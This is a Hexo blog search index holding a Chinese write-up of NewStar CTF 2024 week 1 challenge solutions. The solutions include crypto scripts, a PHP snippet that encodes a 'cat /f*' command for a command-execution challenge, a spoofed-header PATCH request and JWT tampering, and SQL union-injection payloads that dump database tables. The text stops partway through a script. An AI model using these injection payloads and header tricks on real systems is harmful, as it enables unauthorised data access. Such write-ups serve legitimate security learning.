<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>ylctf-round1</title>
    <link href="/2024/10/17/ylctf/ylctf2024/"/>
    <url>/2024/10/17/ylctf/ylctf2024/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ad6edda4c32290bfa37cdd939d397d04a26d2593d4e977fed4fc01f3243658af"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅析node.js原型链污染</title>
    <link href="/2024/10/16/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B5%85%E6%9E%90node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2024/10/16/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E6%B5%85%E6%9E%90node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>node.js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Newstar2024 week1-2</title>
    <link href="/2024/10/16/Newstar/Newstar2024/"/>
    <url>/2024/10/16/Newstar/Newstar2024/</url>
    
    <content type="html"><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1()"></a>week1()</h1><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><h3 id="ez-answer"><a href="#ez-answer" class="headerlink" title="ez_answer"></a>ez_answer</h3><p>正常答题老实一点就出flag了，正常的规则</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="decompress"><a href="#decompress" class="headerlink" title="decompress"></a>decompress</h3><p>前几层正常的解压，到最后一层有hint提示，是正则提示简单的看一下，一共是五位密码，前三位是小写字母，第四位数字，第五位是小写字母，用常见的爆破工具进行爆破一下就行，需要十分钟左右的时间吧爆破出来的密码是xtr4m，进去打开第一个压缩包就有flag</p><p><img src="/../../images/Newstar/2024/1.png" alt="1"></p><h3 id="pleasingMusic"><a href="#pleasingMusic" class="headerlink" title="pleasingMusic"></a>pleasingMusic</h3><p><img src="/../../images/Newstar/2024/2.png" alt="2"></p><p>aud看一下有摩斯电码，用在线网站先进行初步的音频分离，然后利用题目正反都好听，将.-从后往前敲自己在线网站手敲一下得到编码ez_morse_code，最后套个flag</p><h3 id="WhereIsFlag"><a href="#WhereIsFlag" class="headerlink" title="WhereIsFlag"></a>WhereIsFlag</h3><p>flag在proc&#x2F;self&#x2F;envrion里面,典型的藏在环境变量里</p><h3 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h3><p>简单的lsb查找</p><p><img src="/../../images/Newstar/2024/3.png" alt="1"></p><h3 id="兑换码"><a href="#兑换码" class="headerlink" title="兑换码"></a>兑换码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python script.py &lt;png_path&gt;&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br><br>file = sys.argv[<span class="hljs-number">1</span>]<br>fr = <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>data = <span class="hljs-built_in">bytearray</span>(fr[<span class="hljs-number">12</span>:<span class="hljs-number">29</span>])<br><br><span class="hljs-comment"># 获取 CRC32 校验和</span><br>crc32key = struct.unpack(<span class="hljs-string">&#x27;&gt;I&#x27;</span>, fr[<span class="hljs-number">29</span>:<span class="hljs-number">33</span>])[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xffffffff</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;CRC32 Key: <span class="hljs-subst">&#123;crc32key&#125;</span>&quot;</span>)<br><br>n = <span class="hljs-number">4096</span><br>found = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    width = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, w))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        height = <span class="hljs-built_in">bytearray</span>(struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, h))<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            data[x+<span class="hljs-number">4</span>] = width[x]<br>            data[x+<span class="hljs-number">8</span>] = height[x]<br>        crc32result = zlib.crc32(data)<br>        <span class="hljs-keyword">if</span> crc32result == crc32key:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Width: <span class="hljs-subst">&#123;w&#125;</span>, Height: <span class="hljs-subst">&#123;h&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Data: <span class="hljs-subst">&#123;data&#125;</span>&quot;</span>)<br>            newpic = <span class="hljs-built_in">bytearray</span>(fr)<br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>                newpic[x+<span class="hljs-number">16</span>] = width[x]<br>                newpic[x+<span class="hljs-number">20</span>] = height[x]<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> fw:<br>                fw.write(newpic)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;新图片已保存为: <span class="hljs-subst">&#123;file&#125;</span>&quot;</span>)<br>            found = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> found:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>简单的crc爆破，直接脚本梭就行了，flag在底部</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> bytes_to_long, long_to_bytes<br><br><span class="hljs-comment"># 密钥和加密的值</span><br>key = <span class="hljs-string">b&#x27;New_Star_CTF&#x27;</span><br>c1 = <span class="hljs-number">8091799978721254458294926060841</span><br>c2 = <span class="hljs-string">b&#x27;;:\x1c1&lt;\x03&gt;*\x10\x11u;&#x27;</span><br><br><span class="hljs-comment"># 解密 m1</span><br>m1 = c1 ^ bytes_to_long(key)<br><br><span class="hljs-comment"># 解密 m2</span><br>m2 = <span class="hljs-built_in">bytes</span>(a ^ b <span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(c2, key))<br><br><span class="hljs-comment"># 将解密的结果转换为字节并打印</span><br>flag_part1 = long_to_bytes(m1).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>flag_part2 = m2.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-comment"># 输出完整的 flag</span><br>flag = flag_part1 + flag_part2<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Decrypted flag:&#x27;</span>, flag)<br></code></pre></td></tr></table></figure><h3 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h3><p>赛博厨子一把梭</p><p><img src="/../../images/Newstar/2024/4.png" alt="4"></p><h3 id="一眼秒了"><a href="#一眼秒了" class="headerlink" title="一眼秒了"></a>一眼秒了</h3><p>简单的rsa，题目说n小小的也很可爱，用factordb在线网站看看发现有因子，带入p直接上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><br><span class="hljs-comment"># 已知的值</span><br>n = <span class="hljs-number">52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153</span><br>c = <span class="hljs-number">48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069</span><br>e = <span class="hljs-number">65537</span><br>p = <span class="hljs-number">7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421</span><br><br><span class="hljs-comment"># 计算 q</span><br>q = n // p<br><br><span class="hljs-comment"># 计算 φ(n)</span><br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># 计算 d</span><br>d = invert(e, phi_n)<br><br><span class="hljs-comment"># 解密</span><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><br><span class="hljs-comment"># 输出解密后的 flag</span><br>flag = long_to_bytes(m)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Decrypted flag:&#x27;</span>, flag.decode())<br></code></pre></td></tr></table></figure><h3 id="Strange-King"><a href="#Strange-King" class="headerlink" title="Strange King"></a>Strange King</h3><p>rot的变形移位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_flag</span>(<span class="hljs-params">encrypted_flag</span>):<br>    decrypted_flag = []<br>    shift_values = [<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">17</span>,<span class="hljs-number">19</span>,<span class="hljs-number">21</span>,<span class="hljs-number">23</span>,<span class="hljs-number">25</span>,<span class="hljs-number">27</span>,<span class="hljs-number">29</span>,<span class="hljs-number">31</span>,<span class="hljs-number">33</span>,<span class="hljs-number">35</span>,<span class="hljs-number">37</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>,<span class="hljs-number">43</span>,<span class="hljs-number">45</span>,<span class="hljs-number">47</span>,<span class="hljs-number">49</span>,<span class="hljs-number">51</span>,<span class="hljs-number">53</span>,<span class="hljs-number">55</span>,<span class="hljs-number">57</span>,<span class="hljs-number">59</span>,<span class="hljs-number">61</span>]  <span class="hljs-comment"># 移位值</span><br>    <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(encrypted_flag):<br>        <span class="hljs-comment"># 计算移位</span><br>        shift = shift_values[i % <span class="hljs-built_in">len</span>(shift_values)]<br>        <span class="hljs-keyword">if</span> char.isalpha():  <span class="hljs-comment"># 只处理字母</span><br>            <span class="hljs-comment"># 处理大写字母</span><br>            <span class="hljs-keyword">if</span> char.isupper():<br>                new_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) - shift) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>))<br>            <span class="hljs-comment"># 处理小写字母</span><br>            <span class="hljs-keyword">elif</span> char.islower():<br>                new_char = <span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(char) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) - shift) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>))<br>            decrypted_flag.append(new_char)<br>        <span class="hljs-keyword">else</span>:<br>            decrypted_flag.append(char)  <span class="hljs-comment"># 非字母字符不变</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(decrypted_flag)<br><br><span class="hljs-comment"># 测试</span><br>encrypted_flag = <span class="hljs-string">&quot;ksjr&#123;EcxvpdErSvcDgdgEzxqjql&#125;&quot;</span><br>decrypted_flag = decrypt_flag(encrypted_flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Decrypted flag:&#x27;</span>, decrypted_flag)<br></code></pre></td></tr></table></figure><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="headach3"><a href="#headach3" class="headerlink" title="headach3"></a>headach3</h3><p><img src="/../../images/Newstar/2024/5.png" alt="5"></p><h3 id="会赢吗"><a href="#会赢吗" class="headerlink" title="会赢吗"></a>会赢吗</h3><p>第一部分看源码flag{WA0w</p><p>第二部分!_y4_r3al</p><p><img src="/../../images/Newstar/2024/6.png" alt="5"></p><p>第三部分1y_Gr4sP</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 修改状态为 &quot;解封&quot;</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;state&#x27;</span>).<span class="hljs-property">textContent</span> = <span class="hljs-string">&#x27;解封&#x27;</span>;<br><br><span class="hljs-comment">// 获取实际的 CSRF 令牌</span><br><span class="hljs-keyword">const</span> csrfTokenValue = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;csrf_token&#x27;</span>).<span class="hljs-property">value</span>; <span class="hljs-comment">// 确保这个元素存在</span><br><br><span class="hljs-comment">// 发送请求</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/flag/s34l&#x27;</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(&#123; <span class="hljs-attr">csrf_token</span>: csrfTokenValue &#125;)<br>&#125;)<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())<br>.<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`第三部分Flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>, 下一关: /<span class="hljs-subst">$&#123;data.nextLevel || <span class="hljs-string">&#x27;无&#x27;</span>&#125;</span>`</span>);<br>&#125;)<br>.<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;请求过程中出现错误:&#x27;</span>, error));<br></code></pre></td></tr></table></figure><p>第四部分fSkpKcyF9</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-comment">// 获取 CSRF 令牌</span><br>const csrfToken = document.getElementById(<span class="hljs-string">&#x27;csrf_token&#x27;</span>).value;<br><br><span class="hljs-comment">// 发送请求</span><br>fetch(<span class="hljs-string">&#x27;/api/flag/Ap3x&#x27;</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span><br>    &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-string">`csrf_token=<span class="hljs-subst">$&#123;encodeURIComponent(csrfToken)&#125;</span>`</span><br>&#125;)<br>.then(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.json())<br>.then(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">`Flag: <span class="hljs-subst">$&#123;data.flag&#125;</span>`</span>);<br>&#125;)<br>.catch(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-built_in">console</span>.error(<span class="hljs-string">&#x27;请求过程中出现错误:&#x27;</span>, error));<br><br></code></pre></td></tr></table></figure><p>flag{WA0w!_y4_r3al1y_Gr4sP}？不对，应该直接ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9然后再转base64的</p><h3 id="智械危机"><a href="#智械危机" class="headerlink" title="智械危机"></a>智械危机</h3><p>找到对应的然后跑脚本填入得到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$decrypted_cmd</span>=<span class="hljs-string">&#x27;cat /f*&#x27;</span>;<br><span class="hljs-variable">$cmd</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$decrypted_cmd</span>);<br><span class="hljs-variable">$reversed_cmd</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>) - <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>--) &#123;<br>    <span class="hljs-variable">$reversed_cmd</span> .= <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>&#125;<br><span class="hljs-variable">$hashed_reversed_cmd</span>=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$reversed_cmd</span>);<br><span class="hljs-variable">$decode_key</span>=<span class="hljs-variable">$hashed_reversed_cmd</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$decode_key</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>;<br></code></pre></td></tr></table></figure><p>将得到的对应内容进行post发包即可</p><h3 id="PangBai-过家家（1）"><a href="#PangBai-过家家（1）" class="headerlink" title="PangBai 过家家（1）"></a>PangBai 过家家（1）</h3><p>体感不算好，但是题目很好，不知道为什么这么卡的原因</p><p>第一层没怎么看明白，简单的抓包后修改一下header里的cookie看网络回显location进入第二层</p><p>第二层换cookie，get发包?ask&#x3D;miao</p><p>第三层post发包say&#x3D;hello</p><p>第四层改个referer，再把agent改一下把firefox改成Papa就行了</p><p>这层好像也要改为say&#x3D;玛卡巴卡阿卡哇卡米卡玛卡呣</p><p>第五层好像是发patch，我是python进行发包的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment"># 目标 URL</span><br>url = <span class="hljs-string">&quot;http://101.200.139.65:25030/?ask=Papa&quot;</span><br><br><span class="hljs-comment"># 构造文件上传部分和字符串参数</span><br>files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;patch.zip&#x27;</span>, <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>))&#125;<br>data = &#123;<br>    <span class="hljs-string">&#x27;say&#x27;</span>: <span class="hljs-string">&#x27;玛卡巴卡阿卡哇卡米卡玛卡呣&#x27;</span><br>&#125;<br><br><span class="hljs-comment"># 添加必要的 headers</span><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MH0.J62yrWvSS_4OY6g19WR70lIq5DBRs70ISiH1rf8OUB0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;http://101.200.139.65:35208/?ask=Papa&#x27;</span>,<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Papa/5.0 (Windows NT 10.0; Win64; x64)&#x27;</span>,<br>    <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,<br>    <span class="hljs-string">&#x27;Origin&#x27;</span>: <span class="hljs-string">&#x27;http://101.200.139.65:35208&#x27;</span>,<br>    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>:<span class="hljs-string">&#x27;127.0.0.1&#x27;</span><br>&#125;<br><br><span class="hljs-comment"># 发送 PATCH 请求</span><br>response = requests.patch(url, files=files, data=data, headers=headers)<br><br><span class="hljs-comment"># 打印服务器返回的响应</span><br><span class="hljs-built_in">print</span>(response.text)<br><br></code></pre></td></tr></table></figure><p>第六层好像是jwt的更改，题目给了密钥直接在网站上改为level0再带入进行了</p><p><img src="/../../images/Newstar/2024/13.png" alt="13"></p><p>最后带入进行修改我把包又带到bp的自带浏览器里面得到最后的flag,按一下醒来等flag就行了</p><p><img src="/../../images/Newstar/2024/14.png" alt="14"></p><h3 id="谢谢皮蛋"><a href="#谢谢皮蛋" class="headerlink" title="谢谢皮蛋"></a>谢谢皮蛋</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database()#<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database()#<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Fl4g&#x27;</span>#<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(id,des,<span class="hljs-keyword">value</span>) <span class="hljs-keyword">from</span> Fl4g#<br></code></pre></td></tr></table></figure><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="begin"><a href="#begin" class="headerlink" title="begin"></a>begin</h3><p>跟着流程做，一共三个部分，f5然后a,shiftf12,x</p><p>flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}</p><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><p>简单的base64换表</p><p><img src="/../../images/Newstar/2024/7.png" alt="7"></p><h3 id="ezAndroidStudy"><a href="#ezAndroidStudy" class="headerlink" title="ezAndroidStudy"></a>ezAndroidStudy</h3><p>使用工具是jeb</p><p>flag1和flag2直接全局搜索得到flag部分，flag2在注释里，忘截屏了</p><p><img src="/../../images/Newstar/2024/8.png" alt="8"></p><p>flag3在xml中</p><p><img src="/../../images/Newstar/2024/9.png" alt="9"></p><p>flag4也是搜索然后在注释里得到</p><p><img src="/../../images/Newstar/2024/10.png" alt="10"></p><p>flag5在so里面导出然后带入ida逆向一下</p><p><img src="/../../images/Newstar/2024/11.png" alt="11"></p><h3 id="Simple-encryption"><a href="#Simple-encryption" class="headerlink" title="Simple_encryption"></a>Simple_encryption</h3><p>ida然后f5看main函数，一个简单的异或，定位一下密钥，简单的脚本带入</p><p><img src="/../../images/Newstar/2024/12.png" alt="12"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 